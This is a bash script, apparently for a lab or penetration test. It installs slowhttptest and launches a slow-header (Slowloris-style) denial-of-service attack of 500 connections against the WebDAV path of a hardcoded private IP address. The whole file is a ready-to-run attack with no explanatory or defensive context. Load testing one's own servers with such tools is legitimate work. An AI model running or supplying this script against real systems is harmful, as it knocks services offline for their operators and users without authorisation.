#!/bin/bash

TARGET_IP="192.168.1.21"

if [ -z "$TARGET_IP" ]; then
    exit 1
fi

if ! command -v slowhttptest &> /dev/null; then
    sudo apt-get update && sudo apt-get install -y slowhttptest
fi

slowhttptest -H -c 500 -i 10 -r 50 -t GET -u http://${TARGET_IP}/webdav/ -l 60

exit 0
